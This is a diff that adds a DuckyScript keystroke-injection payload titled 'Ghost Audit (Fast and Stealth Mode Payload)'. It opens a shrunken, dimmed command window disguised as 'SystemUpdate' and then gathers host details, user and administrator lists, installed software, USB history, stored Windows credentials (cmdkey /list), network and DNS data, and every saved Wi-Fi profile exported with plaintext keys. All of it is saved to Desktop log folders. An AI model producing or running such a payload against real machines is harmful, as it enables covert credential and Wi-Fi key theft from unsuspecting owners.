@@ -1,0 +1,30 @@
+REM --- Ghost Audit(Fast and Stealth Mode Payload)---
+DEFAULT_DELAY 50
+REM --- STEP 1:RUN CMD ---
+GUI r
+DELAY 300
+STRING cmd /k "mode con: cols=20 lines=1 & color 08 & title SystemUpdate"
+ENTER
+DELAY 500
+REM ---STEP 2: CREATING THE BASE FILES---
+STRING md "%USERPROFILE%\Desktop\Logs\Sys" & md "%USERPROFILE%\Desktop\Logs\Net" & md "%USERPROFILE%\Desktop\Logs\Wifi"
+ENTER
+DELAY 200
+REM --- STEP 3: SYSTEM ANALYSIS(Sys)---
+STRING wmic logicaldisk get caption,size,freespace > "%USERPROFILE%\Desktop\Logs\Sys\Disk.txt" & wmic memorychip get capacity,speed > "%USERPROFILE%\Desktop\Logs\Sys\RAM.txt" & wmic cpu get name > "%USERPROFILE%\Desktop\Logs\Sys\CPU.txt" & net user > "%USERPROFILE%\Desktop\Logs\Sys\Users.txt" & net localgroup administrators > "%USERPROFILE%\Desktop\Logs\Sys\Admins.txt" & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName" > "%USERPROFILE%\Desktop\Logs\Sys\Software.txt"
+ENTER
+DELAY 500
+STRING wmic os get Caption,CSDVersion,OSArchitecture,Version > "%USERPROFILE%\Desktop\Logs\Sys\OS_Info.txt" & reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR /s | findstr "FriendlyName" > "%USERPROFILE%\Desktop\Logs\Sys\USB.txt" & cmdkey /list > "%USERPROFILE%\Desktop\Logs\Sys\Creds.txt"
+ENTER
+DELAY 300
+REM ---STEP 4: NETWORK ANALYSIS (Net)---
+STRING ipconfig /all > "%USERPROFILE%\Desktop\Logs\Net\IP.txt" & ipconfig /displaydns > "%USERPROFILE%\Desktop\Logs\Net\DNS.txt" & arp -a > "%USERPROFILE%\Desktop\Logs\Net\ARP.txt" & route print > "%USERPROFILE%\Desktop\Logs\Net\Route.txt" & netstat -ano > "%USERPROFILE%\Desktop\Logs\Net\Ports.txt" & type C:\Windows\System32\drivers\etc\hosts > "%USERPROFILE%\Desktop\Logs\Net\Hosts.txt"
+ENTER
+DELAY 500
+REM ---STEP 5: WIRELESS ANALYSIS(Wifi)---
+STRING netsh wlan show all > "%USERPROFILE%\Desktop\Logs\Wifi\Report.txt" & FOR /F "skip=9 tokens=*" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F "tokens=2 delims=:" %B IN ("%A") DO FOR /F "tokens=*" %C IN ("%B") DO NETSH WLAN EXPORT PROFILE name="%C" folder="%USERPROFILE%\Desktop\Logs\Wifi" key=clear
+ENTER
+DELAY 2000
+REM --- FINAL STEP ---
+STRING exit
+ENTER
